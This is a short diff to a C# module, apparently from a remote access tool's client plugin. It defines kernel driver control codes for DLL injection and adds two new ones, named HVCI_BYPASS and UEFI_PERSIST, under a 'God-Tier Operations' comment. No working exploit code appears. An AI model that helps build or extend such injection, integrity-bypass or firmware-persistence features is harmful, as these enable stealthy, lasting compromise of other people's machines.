@@ -69,6 +69,10 @@ namespace Pulsar.Plugins.Client.Modules
         public static readonly uint INJECTION_DLL_THREAD = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x904, METHOD_NEITHER, FILE_ANY_ACCESS);
         public static readonly uint INJECTION_DLL_APC = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x905, METHOD_NEITHER, FILE_ANY_ACCESS);
 
+        // God-Tier Operations
+        public static readonly uint HVCI_BYPASS = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x911, METHOD_NEITHER, FILE_ANY_ACCESS);
+        public static readonly uint UEFI_PERSIST = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x912, METHOD_NEITHER, FILE_ANY_ACCESS);
+
         [StructLayout(LayoutKind.Sequential)]
         public struct TargetProcess
         {
